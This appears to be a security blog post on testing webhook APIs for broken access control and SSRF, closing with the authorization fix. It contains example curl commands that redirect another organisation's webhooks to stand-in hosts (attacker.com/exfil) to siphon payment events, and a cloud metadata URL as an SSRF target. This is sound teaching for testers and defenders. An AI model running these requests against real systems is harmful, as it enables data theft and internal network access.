@@ -1,0 +1,76 @@
+---
+title: "broken access control in webhook implementations"
+date: 2026-03-15
+readtime: "6 min read"
+description: "webhooks are one of the most overlooked features in web apps. they're usually built late in the development cycle, bolted onto an existing api, and rarely "
+permalink: /posts/webhooks/
+---
+<p>webhooks are one of the most overlooked features in web apps. they're usually built late in the development cycle, bolted onto an existing api, and rarely get the same access control scrutiny as the core product. that makes them a goldmine for bac bugs.</p>
+
+        <p>the core question is simple: can a low-privileged user create, read, update, or delete webhooks that belong to another user or organization?</p>
+
+        <p>start by mapping the webhook api. most implementations follow a predictable pattern:</p>
+
+<pre><span class="g">POST</span>   /api/webhooks          <span class="c"># create</span>
+<span class="g">GET</span>    /api/webhooks          <span class="c"># list</span>
+<span class="g">GET</span>    /api/webhooks/:id      <span class="c"># read</span>
+<span class="g">PUT</span>    /api/webhooks/:id      <span class="c"># update</span>
+<span class="g">DELETE</span> /api/webhooks/:id      <span class="c"># delete</span></pre>
+
+        <p>create two accounts — one admin, one low-priv. use burp to capture every webhook request from the admin account. then replay each one swapping in the low-priv token.</p>
+
+<pre><span class="c"># create a webhook as low-priv user targeting admin's org</span>
+<span class="g">$</span> curl <span class="y">-X POST</span> https://target.com/api/webhooks \
+  <span class="y">-H</span> "Authorization: Bearer LOW_PRIV_TOKEN" \
+  <span class="y">-H</span> "Content-Type: application/json" \
+  <span class="y">-d</span> '{
+    "url": "https://attacker.com/hook",
+    "events": ["payment.completed"],
+    "org_id": "ADMIN_ORG_ID"
+  }'</pre>
+
+        <p>if that returns <code>201</code>, you just created a webhook in someone else's organization. every time a payment completes, the data goes to your server. that's a critical finding.</p>
+
+        <p>but don't stop at create. test every operation independently — they often have different auth checks:</p>
+
+<pre><span class="c"># list another org's webhooks</span>
+<span class="g">$</span> curl <span class="y">-s</span> https://target.com/api/webhooks?org_id=ADMIN_ORG_ID \
+  <span class="y">-H</span> "Authorization: Bearer LOW_PRIV_TOKEN" | jq .
+
+<span class="c"># read a specific webhook's config (leaks the destination url)</span>
+<span class="g">$</span> curl <span class="y">-s</span> https://target.com/api/webhooks/WEBHOOK_ID \
+  <span class="y">-H</span> "Authorization: Bearer LOW_PRIV_TOKEN" | jq .
+
+<span class="c"># update: redirect an existing webhook to attacker-controlled url</span>
+<span class="g">$</span> curl <span class="y">-X PUT</span> https://target.com/api/webhooks/WEBHOOK_ID \
+  <span class="y">-H</span> "Authorization: Bearer LOW_PRIV_TOKEN" \
+  <span class="y">-d</span> '{"url": "https://attacker.com/exfil"}'
+
+<span class="c"># delete: disrupt monitoring/integrations</span>
+<span class="g">$</span> curl <span class="y">-X DELETE</span> https://target.com/api/webhooks/WEBHOOK_ID \
+  <span class="y">-H</span> "Authorization: Bearer LOW_PRIV_TOKEN"</pre>
+
+        <p>the most common patterns i've seen:</p>
+
+        <p><code>create</code> is checked, but <code>update</code> isn't — so you can't make a new webhook in their org, but you can hijack an existing one by changing the destination url. silent data exfiltration.</p>
+
+        <p><code>list</code> and <code>read</code> are often wide open — leaking webhook configs, secrets, and destination urls. even if you can't modify anything, knowing where their data flows is valuable intel.</p>
+
+        <p><code>delete</code> is sometimes unprotected — an attacker could silently break an org's integrations. subtle denial of service that's hard to debug.</p>
+
+        <p>another thing to check: webhook secrets. some apps include a signing secret in the response body when you create or read a webhook:</p>
+
+<pre>{
+  "id": "wh_123",
+  "url": "https://customer.com/hook",
+  <span class="g">"secret": "whsec_a1b2c3d4e5f6"</span>,
+  "events": ["payment.completed"]
+}</pre>
+
+        <p>if a low-priv user can read that signing secret, it's a different class of problem: the secret is what the <em>receiver</em> uses to verify a payload really came from the provider. with it, an attacker can forge validly-signed events and deliver them straight to the customer's endpoint, impersonating the provider — the receiver checks the signature, it matches, and it processes the fake event as real.</p>
+
+        <p><strong>the ssrf angle</strong></p>
+
+        <p>here's the part that's easy to miss on a webhook feature: the <em>destination</em> url is attacker-controlled, and the server is the thing that connects to it. that's a server-side request forgery sink handed to you by design. set (or hijack) a webhook url pointing at <code>http://169.254.169.254/latest/meta-data/</code> or an internal-only service, trigger the event, and the server makes the request for you. it's usually blind — you don't get the response back — but the server will happily deliver the event to an internal address, and timing or downstream side effects often confirm the reach. any webhook endpoint that accepts an arbitrary url without validating it against the private/reserved ranges (127/8, rfc1918, 169.254/16, 100.64/10, ipv4-mapped, ...) is an ssrf primitive sitting on top of the access-control bugs above.</p>
+
+        <p>the fix is straightforward but rarely implemented correctly: every webhook operation should validate that the requesting user has the right role in the target organization. not just auth — <em>authorization</em>. most apps check the first, skip the second.</p>
